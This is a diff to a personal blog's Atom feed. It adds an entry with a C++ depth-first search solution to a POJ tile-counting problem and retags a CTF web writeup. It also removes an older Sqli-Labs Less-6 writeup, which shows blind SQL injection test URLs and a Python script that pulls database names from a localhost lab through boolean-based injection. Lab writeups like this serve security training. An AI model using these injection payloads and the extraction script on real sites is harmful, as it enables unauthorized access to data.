@@ -5,7 +5,7 @@
   <link href="/atom.xml" rel="self"/>
   
   <link href="http://yoursite.com/"/>
-  <updated>2017-06-18T11:45:34.856Z</updated>
+  <updated>2017-06-19T08:36:32.311Z</updated>
   <id>http://yoursite.com/</id>
   
   <author>
@@ -16,11 +16,39 @@
   <generator uri="http://hexo.io/">Hexo</generator>
   
   <entry>
+    <title>ACMPKU-OJ:1979</title>
+    <link href="http://yoursite.com/2017/06/19/ACMPKU-OJ-1979/"/>
+    <id>http://yoursite.com/2017/06/19/ACMPKU-OJ-1979/</id>
+    <published>2017-06-19T08:34:19.000Z</published>
+    <updated>2017-06-19T08:36:32.311Z</updated>
+    
+    <content type="html"><![CDATA[<h1 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h1><h2 id="Description"><a href="#Description" class="headerlink" title="Description"></a>Description</h2><p>There is a rectangular room, covered with square tiles. Each tile is colored either red or black. A man is standing on a black tile. From a tile, he can move to one of four adjacent tiles. But he can’t move on red tiles, he can move only on black tiles.</p>
+<p>Write a program to count the number of black tiles which he can reach by repeating the moves described above.</p>
+<h2 id="Input"><a href="#Input" class="headerlink" title="Input"></a>Input</h2><p>The input consists of multiple data sets. A data set starts with a line containing two positive integers W and H; W and H are the numbers of tiles in the x- and y- directions, respectively. W and H are not more than 20.</p>
+<p>There are H more lines in the data set, each of which includes W characters. Each character represents the color of a tile as follows.</p>
+<p>‘.’ - a black tile<br>‘#’ - a red tile<br>‘@’ - a man on a black tile(appears exactly once in a data set)<br>The end of the input is indicated by a line consisting of two zeros.</p>
+<h2 id="Output"><a href="#Output" class="headerlink" title="Output"></a>Output</h2><p>For each data set, your program should output a line which contains the number of tiles he can reach from the initial tile (including itself).</p>
+<h2 id="Sample-Input"><a href="#Sample-Input" class="headerlink" title="Sample Input"></a>Sample Input</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div></pre></td><td class="code"><pre><div class="line">6 9</div><div class="line">....#.</div><div class="line">.....#</div><div class="line">......</div><div class="line">......</div><div class="line">......</div><div class="line">......</div><div class="line">......</div><div class="line">#@...#</div><div class="line">.#..#.</div><div class="line">11 9</div><div class="line">.#.........</div><div class="line">.#.#######.</div><div class="line">.#.#.....#.</div><div class="line">.#.#.###.#.</div><div class="line">.#.#..@#.#.</div><div class="line">.#.#####.#.</div><div class="line">.#.......#.</div><div class="line">.#########.</div><div class="line">...........</div><div class="line">11 6</div><div class="line">..#..#..#..</div><div class="line">..#..#..#..</div><div class="line">..#..#..###</div><div class="line">..#..#..#@.</div><div class="line">..#..#..#..</div><div class="line">..#..#..#..</div><div class="line">7 7</div><div class="line">..#.#..</div><div class="line">..#.#..</div><div class="line">###.###</div><div class="line">...@...</div><div class="line">###.###</div><div class="line">..#.#..</div><div class="line">..#.#..</div><div class="line">0 0</div></pre></td></tr></table></figure>
+<h2 id="Sample-Output"><a href="#Sample-Output" class="headerlink" title="Sample Output"></a>Sample Output</h2><p>45<br>59<br>6<br>13</p>
+<h1 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h1><p>DFS()</p>
+<h1 id="提交"><a href="#提交" class="headerlink" title="提交"></a>提交</h1><figure class="highlight c"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div></pre></td><td class="code"><pre><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;iostream&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdio&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;cstdlib&gt;</span></span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> X 20</span></div><div class="line"><span class="meta">#<span class="meta-keyword">define</span> Y 20</span></div><div class="line"></div><div class="line"><span class="keyword">using</span> <span class="keyword">namespace</span> <span class="built_in">std</span>;</div><div class="line"><span class="keyword">int</span> x,y;</div><div class="line"><span class="keyword">int</span> nx,ny;</div><div class="line"><span class="keyword">int</span> sx,sy;</div><div class="line"><span class="keyword">int</span> num;</div><div class="line"><span class="keyword">char</span> maze[X][Y];</div><div class="line"><span class="keyword">int</span> dx[<span class="number">4</span>] = &#123;<span class="number">-1</span>,<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>&#125;;</div><div class="line"><span class="keyword">int</span> dy[<span class="number">4</span>] = &#123;<span class="number">0</span>,<span class="number">1</span>,<span class="number">0</span>,<span class="number">-1</span>&#125;;</div><div class="line"><span class="function"><span class="keyword">void</span> <span class="title">dfs</span><span class="params">(<span class="keyword">int</span> r, <span class="keyword">int</span> s)</span></span>&#123;</div><div class="line">    num += <span class="number">1</span>;</div><div class="line">    maze[r][s] = <span class="string">'#'</span>;</div><div class="line"></div><div class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; <span class="number">4</span>; i++)&#123;</div><div class="line">        <span class="keyword">int</span> t1 = r+dx[i];</div><div class="line">        <span class="keyword">int</span> t2 = s+dy[i];</div><div class="line">        <span class="keyword">if</span> (<span class="number">0</span> &lt;= t1 &amp;&amp; t1 &lt; x &amp;&amp; <span class="number">0</span> &lt;= t2 &amp;&amp; t2 &lt; y &amp;&amp; maze[t1][t2] == <span class="string">'.'</span>)&#123;</div><div class="line">            dfs(t1,t2);</div><div class="line">        &#125;</div><div class="line">    &#125;</div><div class="line"></div><div class="line">&#125;</div><div class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></div><div class="line">&#123;</div><div class="line"></div><div class="line">    <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;y,&amp;x);</div><div class="line"></div><div class="line">    <span class="keyword">while</span>( x != <span class="number">0</span> &amp;&amp; y != <span class="number">0</span>)&#123;</div><div class="line">        num  = <span class="number">0</span>;</div><div class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; x; i++)&#123;</div><div class="line">            <span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; y; j++)&#123;</div><div class="line">                <span class="built_in">scanf</span>(<span class="string">"\n%c"</span>,&amp;maze[i][j]);</div><div class="line">                <span class="keyword">if</span> (maze[i][j] == <span class="string">'@'</span>)&#123;</div><div class="line">                    sx = i;</div><div class="line">                    sy = j;</div><div class="line">                &#125;</div><div class="line">            &#125;</div><div class="line">        &#125;</div><div class="line">        dfs(sx,sy);</div><div class="line">        <span class="built_in">printf</span>(<span class="string">"%d\n"</span>,num);</div><div class="line">        <span class="built_in">scanf</span>(<span class="string">"%d%d"</span>,&amp;y,&amp;x);</div><div class="line">    &#125;</div><div class="line"></div><div class="line">    <span class="keyword">return</span> <span class="number">0</span>;</div><div class="line">&#125;</div></pre></td></tr></table></figure>
+]]></content>
+    
+    <summary type="html">
+    
+      &lt;h1 id=&quot;题目&quot;&gt;&lt;a href=&quot;#题目&quot; class=&quot;headerlink&quot; title=&quot;题目&quot;&gt;&lt;/a&gt;题目&lt;/h1&gt;&lt;h2 id=&quot;Description&quot;&gt;&lt;a href=&quot;#Description&quot; class=&quot;headerlink&quot; title=&quot;Des
+    
+    </summary>
+    
+    
+  </entry>
+  
+  <entry>
     <title>“春秋杯”web-writeup</title>
     <link href="http://yoursite.com/2017/06/18/%E2%80%9C%E6%98%A5%E7%A7%8B%E6%9D%AF%E2%80%9Dweb-writeup/"/>
     <id>http://yoursite.com/2017/06/18/“春秋杯”web-writeup/</id>
     <published>2017-06-18T10:48:59.000Z</published>
-    <updated>2017-06-18T11:45:34.856Z</updated>
+    <updated>2017-06-19T00:11:43.501Z</updated>
     
     <content type="html"><![CDATA[<p>朋友打比赛，向她（对，女字旁的她）要的web题地址。<br><a id="more"></a></p>
 <h1 id="WEB-01"><a href="#WEB-01" class="headerlink" title="WEB-01"></a>WEB-01</h1><p>访问，有一张图片。<br><img src="https://github.com/CHYbeta/chybeta.github.io/blob/master/images/pic/20170618/1.jpg?raw=true" alt=""></p>
@@ -56,7 +84,9 @@
     
       <category term="CTF" scheme="http://yoursite.com/tags/CTF/"/>
     
-      <category term="writeup，web" scheme="http://yoursite.com/tags/writeup%EF%BC%8Cweb/"/>
+      <category term="writeup" scheme="http://yoursite.com/tags/writeup/"/>
+    
+      <category term="web" scheme="http://yoursite.com/tags/web/"/>
     
   </entry>
   
@@ -816,53 +846,6 @@
       <category term="脚本" scheme="http://yoursite.com/tags/%E8%84%9A%E6%9C%AC/"/>
     
       <category term="beautifulsoup" scheme="http://yoursite.com/tags/beautifulsoup/"/>
-    
-  </entry>
-  
-  <entry>
-    <title>Sqli-Labs:Less6-writeup</title>
-    <link href="http://yoursite.com/2017/04/03/Sqli-Labs-Less6-writeup/"/>
-    <id>http://yoursite.com/2017/04/03/Sqli-Labs-Less6-writeup/</id>
-    <published>2017-04-03T02:37:04.000Z</published>
-    <updated>2017-04-03T02:46:29.655Z</updated>
-    
-    <content type="html"><![CDATA[<p>第六关是盲注<br><a id="more"></a></p>
-<h1 id="Step1"><a href="#Step1" class="headerlink" title="Step1"></a>Step1</h1><p><img src="https://github.com/CHYbeta/chybeta.github.io/raw/master/images/pic/20170403/sqlilabsless6/step1.jpg" alt=""></p>
-<ul>
-<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-6/?id=1&apos;</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>无报错</p>
-<ul>
-<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-6/?id=1&quot;</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>页面报错，返回信息： use near ‘“1”” LIMIT 0,1’ at line 1。需要闭合双引号。</p>
-<ul>
-<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-6/?id=1&quot; AND 1=1 --+</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>页面返回正常</p>
-<ul>
-<li><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">http://localhost:20000/sqllab/Less-6/?id=1&quot; AND 1=2 --+</div></pre></td></tr></table></figure>
-</li>
-</ul>
-<p>返回错误页面（空白）</p>
-<h1 id="Step2"><a href="#Step2" class="headerlink" title="Step2"></a>Step2</h1><p>采用盲注。分析同Less5。exp如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">import</span> requests</div><div class="line"><span class="keyword">import</span> string</div><div class="line"><span class="keyword">import</span> sys</div><div class="line"></div><div class="line">querydata = <span class="string">"schema_name"</span></div><div class="line">querydb = <span class="string">"INFORMATION_SCHEMA"</span></div><div class="line"><span class="keyword">global</span> findBit</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">sendPayload</span><span class="params">(payload)</span>:</span></div><div class="line">	url = <span class="string">'http://localhost:20000/sqllab/Less-6/?id=1" '</span>+ payload</div><div class="line">	content = requests.get(url).text</div><div class="line">	<span class="keyword">return</span> content</div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">findDatabaseNumber</span><span class="params">()</span>:</span></div><div class="line">	count = <span class="number">1</span></div><div class="line">	<span class="keyword">while</span> count:</div><div class="line">		payload = <span class="string">"AND (SELECT COUNT(*) FROM INFORMATION_SCHEMA.SCHEMATA) ="</span></div><div class="line">		payload = payload + str(count) + <span class="string">"--+"</span></div><div class="line">		recv = sendPayload(payload)</div><div class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">			<span class="keyword">return</span> count</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			count += <span class="number">1</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">getDatabaseName</span><span class="params">(dbNum)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	<span class="keyword">for</span> k <span class="keyword">in</span> range(dbNum):</div><div class="line">		i = <span class="number">1</span></div><div class="line">		<span class="keyword">while</span> i :</div><div class="line">			findBit = <span class="number">0</span></div><div class="line">			doubleSearch(<span class="number">-1</span>,<span class="number">255</span>,i,k)</div><div class="line">			i += <span class="number">1</span></div><div class="line">			<span class="keyword">if</span> findBit == <span class="number">1</span>:</div><div class="line">				sys.stdout.write(<span class="string">"\r\n"</span>)</div><div class="line">				<span class="keyword">break</span></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">doubleSearch</span><span class="params">(leftNum,rightNum,i,k)</span>:</span></div><div class="line">	<span class="keyword">global</span> findBit</div><div class="line">	midNum = (leftNum + rightNum) / <span class="number">2</span></div><div class="line">	<span class="keyword">if</span> (rightNum != leftNum +<span class="number">1</span>):</div><div class="line">		querysql = <span class="string">"AND ASCII(SUBSTRING((SELECT schema_name FROM INFORMATION_SCHEMA.SCHEMATA LIMIT "</span> + str(k) + <span class="string">",1),"</span> + str(i) + <span class="string">",1)) &gt; "</span> + str(midNum) + <span class="string">"--+"</span></div><div class="line">		recv = sendPayload(querysql)</div><div class="line">		<span class="keyword">if</span> <span class="string">"You are in"</span> <span class="keyword">in</span> recv:</div><div class="line">			doubleSearch(midNum,rightNum,i,k)</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			doubleSearch(leftNum,midNum,i,k)</div><div class="line">	<span class="keyword">else</span>:</div><div class="line">		<span class="keyword">if</span> rightNum != <span class="number">0</span>:</div><div class="line">			sys.stdout.write(chr(rightNum))</div><div class="line">			sys.stdout.flush()</div><div class="line">		<span class="keyword">else</span>:</div><div class="line">			findBit = <span class="number">1</span></div><div class="line">			<span class="keyword">return</span></div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">()</span>:</span></div><div class="line">	dbNum = findDatabaseNumber()</div><div class="line"> 	<span class="keyword">print</span> <span class="string">"the number of database is "</span>+str(dbNum)</div><div class="line"> 	getDatabaseName(dbNum)</div><div class="line"></div><div class="line">exp()</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;p&gt;第六关是盲注&lt;br&gt;
-    
-    </summary>
-    
-      <category term="Web安全" scheme="http://yoursite.com/categories/Web%E5%AE%89%E5%85%A8/"/>
-    
-    
-      <category term="SQL注入" scheme="http://yoursite.com/tags/SQL%E6%B3%A8%E5%85%A5/"/>
-    
-      <category term="sqlilab" scheme="http://yoursite.com/tags/sqlilab/"/>
     
   </entry>
   
